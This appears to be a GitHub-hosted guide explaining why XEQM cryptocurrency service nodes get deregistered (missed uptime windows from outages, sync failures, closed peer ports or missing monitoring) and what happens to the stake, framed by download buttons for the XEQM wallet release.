![XEQM WALLET](assets/banner-article.png)

# Why was my XEQM node deregistered

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows" /> | Windows 10 or 11, 64-bit | [`XEQM-GUI-2.3.6-win.exe`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe) |
| <img src="https://img.shields.io/badge/macOS-1371E6?style=flat-square&logo=apple&logoColor=white" alt="macOS" /> | macOS, Apple Silicon | [`XEQM-GUI-2.3.6-mac.dmg`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg) |
| <img src="https://img.shields.io/badge/Linux-1371E6?style=flat-square&logo=linux&logoColor=white" alt="Linux" /> | x64 Linux, AppImage | [`XEQM-GUI-2.3.6-linux.AppImage`](https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage) |

</div>


All versions and checksums are on the [XEQM WALLET release page](https://github.com/XEQMFoundation/XEQM-Wallet/releases/tag/v2.3.6).

Requirements follow the platforms the release ships assets for. No minimum OS build or disk figure is published for this tag.

> Only download from this GitHub release page.

A service node is deregistered when it misses its uptime validation windows, and the usual causes are a machine that went offline, a node that stopped syncing, a firewall that closed its peer port, or an operator who stopped watching. Deregistration costs the rewards and the standing, not the principal: the stake returns to the originating wallet.

## What deregistration actually is

It is the network removing a node from the active set. The bond is released back to the wallet that committed it, the node stops being eligible to win, and its position in the queue for future registration is lost.

That is a softer outcome than slashing, and a harder one than a warning. Nothing is confiscated, and the income stops.

## The mechanism: uptime windows

Service nodes are checked on whether they are present and responsive when their turn comes. Missing enough of those checks is what triggers removal.

The checks are not a continuous vote; they are windows, which is why a node can look healthy in a dashboard and still miss one. Being up most of the time is not the same as being up at the right time.

## Cause one: the machine went away

Power loss, a host reboot for maintenance, a laptop that slept, a provider that migrated an instance. Any of those takes the node off the network, and a node that is off cannot answer.

Hosted instances reduce this and do not remove it. A provider's maintenance window is still a window, and the node is still absent during it.

## Cause two: the node stopped syncing

A node that is running but behind cannot answer correctly. A disk that filled, a daemon that lost write access to its data directory, or a chain that outgrew the disk all produce a node that is present and useless.

That is the failure mode people miss, because the process is alive and the machine is up. [XEQM WALLET not syncing](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-wallet-not-syncing-fix.md) covers the diagnosis from the wallet side.

## Cause three: the port closed

Peer-to-peer traffic uses 9230, RPC uses 9231 and quorumnet uses 9232. If the peer port stops being reachable  -  a firewall change, a router reboot that dropped a forward, a provider rule  -  the node becomes unfindable.

An unfindable node misses the checks that decide whether it is there. [XEQM daemon firewall ports](https://github.com/XEQMFoundation/platform-setup/blob/main/xeqm-daemon-firewall-ports.md) covers the rules.

## Cause four: nobody was watching

The most common cause in practice is the absence of monitoring. A node fails at three in the morning, nobody notices for a week, and the first message is a deregistration.

An uptime check and an alert cost almost nothing and turn that week into a message. [Monitor XEQM node uptime](https://github.com/XEQMFoundation/account-guide/blob/main/monitor-xeqm-node-uptime.md) covers what to watch.

## What a dashboard will not tell you

A node can show a green process, an open port and a synced chain while still missing a window, because the check is about being there at a moment rather than about being healthy in general.

That is why monitoring should watch the network's view of the node rather than only the machine's view of itself. A status query answers a different question from a process check.

## The first week is the test

Most preventable deregistrations happen early, when the setup has not met a real busy period. Watch the node closely for the first week, note anything that restarts or stalls, and fix it while the cause is fresh.

After that, the risks are maintenance and drift: an update that changes a port, a firewall rule that gets reordered, a disk that slowly fills.

## What you lose, and what you keep

You lose the rewards for the period and the standing that came with the registration. You keep the bond, which returns to the originating wallet.

There is no slashing of the principal in any current source, so the financial loss is the income and the time, not the 200,000. That distinction is worth knowing before you panic.

## What happens to the stake

It returns to the wallet that registered the node. In a pool, that is the operator's wallet, and distribution to contributors follows the pool's terms rather than the network's.

So a contributor's first question after a deregistration is to the operator, and the operator's first question is to the network. [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md) covers the pool arrangement.

## Re-registering

A deregistered node can be registered again once the cause is fixed: the machine is stable, the chain is synced, the ports are reachable, and the monitoring is in place.

Doing it without fixing the cause produces the same outcome on a shorter timeline. The network does not remember intentions, only windows.

## What a pool operator owes contributors

A contributor cannot see the machine, so the operator's report is the only view they get. An operator who tells contributors promptly that a node has been removed is doing the job; one who lets them discover it from a balance is not.

That is a communication obligation rather than a technical one, and it is the difference between a pool people stay in and a pool they leave after the first silence.

## What to do today

If your node has just been removed: confirm the bond returned, find out which window was missed, and check the four causes in order. Then decide whether to re-register or exit.

If your node is still running: add the alert you have been meaning to add. That single action prevents most of the cases described on this page.

## Preventing the next one

Four habits cover most of it: a machine that does not sleep, a disk with room, a port that stays open, and an alert that reaches you. Add a restart policy so a crashed daemon comes back without you.

None of those are exotic. They are the difference between running a node and owning one. [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md) covers the specification that makes them possible.

## What a deregistration does not mean

It does not mean the network rejected you, that the stake is gone, or that the wallet is compromised. It means the node was not there when it was checked, which is an operational fact rather than a judgement.

Treat it as a monitoring failure first and a networking failure second. Those two cover almost every case.

## The honest summary

Nodes are removed for absence. The absence is usually a machine, a disk, a port or an unattended failure, and it is almost always preventable with hardware that stays up and a check that tells you when it does not.

The bond comes back. The rewards do not, and the standing that made the node worth running has to be earned again from a fresh registration. That is the real cost of an avoidable absence. [XEQM unbonding after unstaking](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-unbonding-period-after-unstaking.md) covers the exit timeline if you decide to stop rather than restart.

## Frequently asked questions

### Is my stake lost when a node is deregistered?

No. It returns to the originating wallet. What is lost is the rewards and the standing.

### Can I register the same node again?

Yes, once the cause is fixed. Registering a node that will fail again produces the same result sooner.

### How many windows can a node miss?

The network checks uptime over windows, and missing enough of them triggers removal. Treat any missed window as a warning rather than a budget.

### Does a hosted node avoid this?

It removes power and cooling failures and leaves provider maintenance, disk, ports and monitoring as your responsibility.

---

<p align="center"><a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-win.exe"><img src="assets/button-windows.png" alt="Download for Windows" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-mac.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2F90F3?style=for-the-badge&labelColor=11141B&logo=apple&logoColor=white" alt="Download for macOS" /></a> <a href="https://github.com/XEQMFoundation/XEQM-Wallet/releases/download/v2.3.6/XEQM-GUI-2.3.6-linux.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2F90F3?style=for-the-badge&labelColor=11141B&logo=linux&logoColor=white" alt="Download for Linux" /></a></p>

## Related guides

- [How much XEQM runs a service node](https://github.com/XEQMFoundation/account-guide/blob/main/how-much-xeqm-to-run-a-service-node.md)
- [Staking XEQM with less than 200K](https://github.com/XEQMFoundation/account-guide/blob/main/can-i-stake-xeqm-with-less.md)
- [XEQM service node hardware](https://github.com/XEQMFoundation/account-guide/blob/main/xeqm-service-node-hardware-requirements.md)
